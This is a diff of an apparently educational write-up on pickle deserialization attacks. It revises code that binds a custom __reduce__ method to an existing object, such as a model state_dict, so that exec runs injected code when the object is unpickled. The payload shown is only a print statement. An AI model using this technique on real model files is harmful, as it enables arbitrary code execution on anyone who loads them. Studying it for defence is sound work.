@@ -43,31 +43,21 @@ If you serialize this class object and load the object back, you will see the re
 In case of a man-in-the-middle attack where  model classes are already defined and their objects are pickled, we can bind the malicious `reduce` function code to the pickled object. Here's how an attacker might bind the malicious code to a given object to execute harmful code:
 ```python
 
-class MaliciousObject:
+def inject_malicious_code(obj, code_str):
+    # Define a custom reduce function
+    def reduce(self):
+        return (exec, (code_str,))
 
-	def __init__(self, original_obj, code_str):
-		self.original_obj = original_obj
-		self.code_str = code_str
-
-	def __reduce__(self):
-		"""
-		This func is called when the object is deserialized.
-		This will call `execute_and_return` func which
-		executes the malicious code and also returns the original
-		object for reconstruction.
-		"""
-		return (self.execute_and_return, (self.code_str, self.original_obj))
-
-  	@staticmethod
-	def execute_and_return(code_str, obj):	
-		exec(code_str)
-		return obj
+    # Bind the custom reduce function to the object's __reduce__ method
+    bound_reduce = reduce.__get__(obj, obj.__class__)
+    setattr(obj, "__reduce__", bound_reduce)
+    return obj
 
 MALICIOUS_CODE_STR = """
 print('hello')
 """
 
-state_dict = MaliciousObject(state_dict, MALICIOUS_CODE_STR)
+state_dict = inject_malicious_code(state_dict, MALICIOUS_CODE_STR)
 ```
 
 Let's extend this to a critical scenario by replacing the print statement.
